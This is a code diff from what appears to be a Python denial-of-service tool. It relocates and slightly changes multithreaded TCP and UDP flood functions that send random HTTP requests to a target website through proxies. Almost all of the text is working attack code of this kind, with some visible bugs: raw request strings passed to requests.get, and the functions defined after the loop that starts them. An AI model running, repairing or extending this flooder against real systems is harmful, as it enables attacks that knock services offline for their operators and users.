@@ -172,87 +172,6 @@ def generate_payload():
     # Return the payload
     return payload
 
-# Define a function to perform the attack on the website using TCP
-def tcp_flood():
-
-    # Create a TCP socket object
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # Try to connect to the host and port
-    try:
-        s.connect((host, port))
-
-        # Choose a random user agent from the list
-        ua = random.choice(UserAgent)
-        
-        # Generate a random payload
-        payload = generate_payload()
-
-        # Construct a HTTP request with the user agent and payload
-        # Use f-strings instead of format for readability and performance
-        request = f"GET /{payload} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n\r\n"
-        
-        # Make a request using the proxies
-        response = requests.get(request, proxies=proxies)
-
-        # Encode the request as bytes
-        request_bytes = request.encode()
-
-        # Send the request to the socket
-        s.send(request_bytes)
-        
-        # Print a message indicating success
-        # Use f-strings instead of format for readability and performance
-        print(f"Sent {len(request_bytes)} bytes to {host}:{port} using TCP")
-
-        # Close the socket
-        s.close()
-
-    # If an exception occurs, print an error message
-    except Exception as e:
-        # Use parentheses for print function in Python 3
-        print(f'Error: {e}')
-        s.close()
-# Define a function to perform the attack on the website using UDP
-def udp_flood():
-
-    # Create a UDP socket object
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-    # Try to send data to the host and port
-    try:
-
-        # Choose a random user agent from the list
-        ua = random.choice(UserAgent)
-
-        # Generate a random payload
-        payload = generate_payload()
-        
-        # Create a HTTP request with the user agent and payload
-        # Use f-strings instead of format for readability and performance
-        request = f"GET /{payload} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n\r\n"
-        
-        # Make a request using the proxies
-        response = requests.get(request, proxies=proxies)
-
-        # Encode the request as bytes
-        payload_bytes = payload.encode()
-
-        # Send the payload bytes to the host and port
-        s.sendto(payload_bytes, (host, port))
-        
-        # Print a message indicating success
-        # Use f-strings instead of format for readability and performance
-        print(f"Sent {len(payload_bytes)} bytes to {host}:{port} using UDP")
-
-        # Close the socket
-        s.close()
-
-    # If an exception occurs, print an error message
-    except Exception as e:
-        # Use parentheses for print function in Python 3
-        print(f'Error: {e}')
-
 # Define a function to run multiple threads of the attack function
 def run_Threads():
 
@@ -298,3 +217,85 @@ for i in range(Threads):
     # Create and start a thread object with the attack function as the target
     
     threading.Thread(target=udp_flood).start()
+
+# Define a function to perform the attack on the website using TCP
+def tcp_flood():
+
+    # Create a TCP socket object
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Try to connect to the host and port
+    try:
+        s.connect((host, port))
+
+        # Choose a random user agent from the list
+        ua = random.choice(UserAgent)
+        
+        # Generate a random payload
+        payload = generate_payload()
+
+        # Construct a HTTP request with the user agent and payload
+        # Use f-strings instead of format for readability and performance
+        request = f"GET /{payload} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {UserAgent}\r\nContent-Length: {len(payload)}\r\n\r\n"
+        
+        # Make a request using the proxies
+        response = requests.get(request, proxies=proxies)
+
+        # Encode the request as bytes
+        request_bytes = request.encode()
+
+        # Send the request to the socket
+        s.send(request_bytes)
+        
+        # Print a message indicating success
+        # Use f-strings instead of format for readability and performance
+        print(f"Sent {len(request_bytes)} bytes to {host}:{port} using TCP")
+
+        # Close the socket
+        s.close()
+
+    # If an exception occurs, print an error message
+    except Exception as e:
+        # Use parentheses for print function in Python 3
+        print(f'Error: {e}')
+        s.close()
+# Define a function to perform the attack on the website using UDP
+def udp_flood():
+
+    # Create a UDP socket object
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    # Try to send data to the host and port
+    try:
+
+        # Choose a random user agent from the list
+        ua = random.choice(UserAgent)
+
+        # Generate a random payload
+        payload = generate_payload()
+        
+        # Create a HTTP request with the user agent and payload
+        # Use f-strings instead of format for readability and performance
+        request = f"GET /{payload} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {UserAgent}\r\nContent-Length: {len(payload)}\r\n\r\n"
+        
+        # Make a request using the proxies
+        response = requests.get(request, proxies=proxies)
+
+        # Encode the request as bytes
+        payload_bytes = payload.encode()
+
+        # Send the payload bytes to the host and port
+        s.sendto(payload_bytes, (host, port))
+        
+        # Print a message indicating success
+        # Use f-strings instead of format for readability and performance
+        print(f"Sent {len(payload_bytes)} bytes to {host}:{port} using UDP")
+
+        # Close the socket
+        s.close()
+
+    # If an exception occurs, print an error message
+    except Exception as e:
+        # Use parentheses for print function in Python 3
+        print(f'Error: {e}')
+
